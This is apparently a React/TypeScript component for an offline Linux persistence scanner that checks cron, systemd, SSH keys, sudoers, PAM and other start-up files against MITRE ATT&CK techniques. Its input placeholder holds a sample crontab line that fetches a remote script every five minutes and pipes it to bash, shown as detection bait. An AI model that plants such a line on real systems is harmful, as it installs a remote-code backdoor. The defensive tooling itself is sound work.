import { SquareTerminal } from "lucide-react";
import { api } from "@/lib/ipc";
import { LINUX_KIND_LABEL, linuxFinding } from "../lib/linux";
import { type ConfigCheckConfig, ConfigCheckTool } from "./ConfigCheckTool";

const LINUX_CHECKS: ConfigCheckConfig = {
  privacy:
    "Reads the text, file or file system on this device; nothing is run or uploaded, files are never changed, and symbolic links are not followed. Cron, systemd services and timers, rc scripts, the preload list, shell start-up files, SSH keys, accounts, sudo, PAM, desktop autostart, udev and login message scripts are checked for what attackers leave there, with the MITRE ATT&CK technique of each place. Matches are leads to confirm.",
  kinds: [
    { id: "auto", label: "Detect" },
    { id: "crontab", label: "Crontab (user)" },
    { id: "system-crontab", label: "Crontab (system, with user field)" },
    { id: "systemd", label: "systemd unit" },
    { id: "shell", label: "Shell script or start-up file" },
    { id: "authorized-keys", label: "SSH authorized keys" },
    { id: "sudoers", label: "sudoers" },
    { id: "passwd", label: "passwd" },
    { id: "shadow", label: "shadow" },
    { id: "preload", label: "ld.so.preload" },
    { id: "pam", label: "PAM configuration" },
    { id: "autostart", label: "Desktop autostart entry" },
    { id: "udev", label: "udev rules" },
  ],
  kindLabel: LINUX_KIND_LABEL,
  placeholder: "# a crontab, a systemd unit, a shell profile, authorized_keys, sudoers, passwd…\n*/5 * * * * curl -fsSL http://203.0.113.7/k.sh | bash",
  folderHint: "Choose the folder that holds etc/: a mounted or copied image, or the [root] folder of a UAC collection (file systems up to four levels down are found).",
  empty: { icon: SquareTerminal, title: "Nothing to report", description: "None of the start-up files read showed signs of persistence, and nothing needed listing." },
  scanText: (text, kind) => api.linuxPersistScanText(text, kind),
  scanPick: (folder) => api.linuxPersistScanPick(folder),
  finding: linuxFinding,
};

/** Security utility: persistence on a Linux file system, read offline. */
export function LinuxTool() {
  return <ConfigCheckTool config={LINUX_CHECKS} />;
}
